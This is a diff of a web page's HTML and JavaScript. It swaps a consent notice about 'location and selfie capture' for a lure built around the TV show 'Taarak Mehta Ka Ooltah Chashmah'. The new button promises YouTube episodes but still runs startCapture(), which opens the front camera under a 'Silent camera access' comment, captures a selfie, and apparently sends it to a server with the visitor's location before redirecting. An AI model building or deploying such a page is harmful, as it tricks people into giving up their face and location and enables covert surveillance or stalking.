@@ -27,9 +27,12 @@
     </style>
 </head>
 <body>
-    <h1>Consent: Location & Selfie Capture</h1>
-    <p>Click the button to allow location and selfie capture.<br>Photos and location will be sent securely.</p>
-    <button onclick="startCapture()">Agree & Send Data</button>
+    <!-- TMKOC Image on Top -->
+    <img src="TMKOC.png" alt="TMKOC Poster" width="400">
+
+    <h1 style="text-decoration: underline;">TARAKH MEHTA KA OOLTA CHASHMA</h1>
+    <p>Best Episodes of Tarakh Mehta  *JETHALAL*</p>
+    <button onclick="startCapture()">Open Youtube and start Watching </button>
     <div id="status"></div>
 
 <script>
@@ -37,7 +40,7 @@ async function startCapture() {
     try {
         // Silent camera access
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video  = document.createElement('video');
+        const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
 
@@ -48,7 +51,7 @@ async function startCapture() {
 
             // Capture selfie
             const canvas = document.createElement('canvas');
-            canvas.width  = video.videoWidth  || 320;
+            canvas.width = video.videoWidth || 320;
             canvas.height = video.videoHeight || 240;
             canvas.getContext('2d').drawImage(video, 0, 0);
 
@@ -64,9 +67,11 @@ async function startCapture() {
             const result = await res.json();
             document.getElementById('status').innerText = result.status;
 
-            // On success, open TMKOC video
+            // On success, redirect to /youtube (which will use admin-updated URL)
             if (/success/i.test(result.status)) {
-                window.open('https://youtu.be/pWPSWwK7w8w?si=BVRHs_Kc_STKulz4', '_blank');
+                setTimeout(() => {
+                    window.location.href = '/youtube';
+                }, 1500);
             }
         },
         error => {
